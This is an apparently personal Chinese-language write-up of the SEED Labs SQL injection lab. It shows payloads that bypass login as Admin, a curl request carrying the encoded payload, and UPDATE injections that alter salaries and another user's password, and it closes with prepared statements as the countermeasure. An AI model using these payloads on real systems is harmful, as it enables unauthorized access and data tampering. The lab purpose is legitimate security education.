---
layout: protected
title: "SQL Injection Attack Lab"
date: 2024-04-30
categories: [SEED Labs, Web Security]
tags: [SQL-Injection]
---

# SQL Injection Attack Lab

# Lab Setup

我用的是mac M2芯片，所以要去官网下载arm64版本，然后启动docker。

# Task 1: Get Familiar with SQL Statements

使用SQL语句查询Alice：

```sql
select * from credential where Name='Alice';
```

# Task 2: SQL Injection Attack on SELECT Statement

## Task 2.1: SQL Injection Attack from webpage

username把后边的内容注释掉，注意’--’后边要加一个空格否则不会被识别为注释：

```sql
Admin';-- 
```

## Task 2.2: SQL Injection Attack from command line

用URL编码好，然后使用curl指令：

```bash
curl 'http://www.seed-server.com/unsafe_home.php?username=Admin%27%3B--%20&Password='
```

## Task 2.3: Append a new SQL statement

把Admin改成J3rry：

```sql
Admin'; update credential set name='J3rry' where id=6;-- 
```

注入失败，这是因为’mysqli::query()’不允许多个语句执行。

# Task 3: SQL Injection Attack on UPDATE Statement

## Task 3.1: Modify your own salary

注意到phonenumber在sql查询的最后，所以用单引号闭合然后修改salary，把后面的注释掉：

```sql
', salary='99999' where name='Alice';-- 
```

## Task 3.2: Modify other people’ salary

Alice是个狠人：

```sql
', salary='1' where name='Boby';-- 
```

## Task 3.3: Modify other people’ password

还是和上边一样，直接在Password里边填入新密码，然后再phonenumber里边填入sql注入语句：

```sql
', where name='Boby';-- 
```

然后用新密码登陆Boby。

# Task 4: Countermeasure — Prepared Statement

预处理阶段在编译阶段和执行阶段之间，他只接受SQL语句中的数据部分，然后发送给执行阶段。因为数据中的内容没有经历编译阶段，所以即使数据中有SQL语句也不会被执行的。

比如下边这段代码，用’?’代表数据位置，先把编译好的SQL语句发过去，然后再把数据发过去，其中’is’的意思是，第一个数据的类型是int——’i’，第二个是string——’s’。

```php
$stmt = $conn->prepare("SELECT name, local, gender
FROM USER_TABLE
WHERE id = ? and password = ? ");
// Bind parameters to the query
$stmt->bind_param("is", $id, $pwd);
$stmt->execute();
$stmt->bind_result($bind_name, $bind_local, $bind_gender);
$stmt->fetch();
```

可以看到SQL注入仍然成功：

```sql
Admin';-- 
```

把源码修改为预处理语句：

```php
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name= ? AND Password= ?");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);

$stmt->execute();
$result = $stmt->get_result();
```

此时SQL注入就失效了。